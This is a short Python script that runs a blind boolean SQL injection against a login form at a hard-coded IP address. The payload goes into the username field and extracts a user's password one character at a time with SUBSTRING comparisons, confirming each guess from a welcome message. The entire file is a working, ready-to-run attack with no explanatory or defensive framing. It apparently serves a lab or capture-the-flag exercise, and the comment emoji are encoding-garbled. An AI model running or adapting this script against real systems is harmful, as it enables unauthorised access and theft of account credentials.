import requests

URL = "http://103.87.66.171:3000/login"  # üîÅ Change to your actual URL
SUCCESS_INDICATOR = "Welcome, Pablu"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+=-"
MAX_PASSWORD_LENGTH = 32

def check_condition(pos, char):
    payload = f"Pablu' AND SUBSTRING(password,{pos},1)='{char}'--"
    data = {
        "username": payload,
        "password": "anything"
    }

    response = requests.post(URL, data=data)
    return SUCCESS_INDICATOR in response.text

def extract_password():
    password = ""
    for i in range(1, MAX_PASSWORD_LENGTH + 1):
        found = False
        for char in CHARSET:
            if check_condition(i, char):
                print(f"[+] Found char {i}: {char}")
                password += char
                found = True
                break
        if not found:
            print(f"[!] No character found at position {i}, ending search.")
            break
    return password

if __name__ == "__main__":
    pw = extract_password()
    print(f"\n[‚úÖ] Extracted password: {pw}")
